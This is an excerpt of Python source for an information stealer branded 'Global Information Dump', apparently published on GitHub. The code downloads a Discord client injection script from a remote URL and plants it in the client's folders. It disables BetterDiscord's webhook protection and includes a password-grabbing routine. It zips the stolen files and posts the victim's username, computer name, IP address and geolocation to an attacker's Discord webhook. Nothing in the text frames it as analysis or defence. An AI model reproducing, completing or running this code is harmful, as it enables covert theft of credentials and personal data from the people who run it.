...
class Global_Information_Dump:
    def __init__(self):
        self.webhook = "WEBHOOK_LINK"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Global_Information_Dump"
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\GID"))
                    except FileNotFoundError:
                        pass
                    f = requests.get("https://raw.githubusercontent.com/Encryptofied/1423/main/Injection/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
    ...
    def bypass_better_discord(self):
        ...
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "1423")
        with open(bd, 'w'): pass
    ...
    def grabPassword(self):
        ...
        f.write("Made by 1423 | https://github.com/Encryptofied/Global-Information-Dump\n")
    ...
    def SendInfo(self):
        ...
        new = os.path.join(self.appdata, f'GID-[{os.getlogin()}].zip')
        self.zip(temp, new)
        ...
        embed = {
            "avatar_url":"https://cdn.discordapp.com/icons/922151745856077874/90df5fe9600442d2d8309584c18f2c5d.png?size=4096",
            "embeds": [
                {
                    "author": {
                        "name": "Global Information Dump",
                        "url": "https://github.com/Encryptofied/Global-Information-Dump",
                        "icon_url": "https://cdn.discordapp.com/icons/922151745856077874/90df5fe9600442d2d8309584c18f2c5d.png?size=4096"
                    },
                    "description": f"**{os.getlogin()}** Ran Global Information Dump Software\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/icons/922151745856077874/90df5fe9600442d2d8309584c18f2c5d.png?size=4096"
                    },       

                    "footer": {
                      "text": "1423 - https://github.com/Encryptofied/Global-Information-Dump"
                    }
                }
            ]
        }
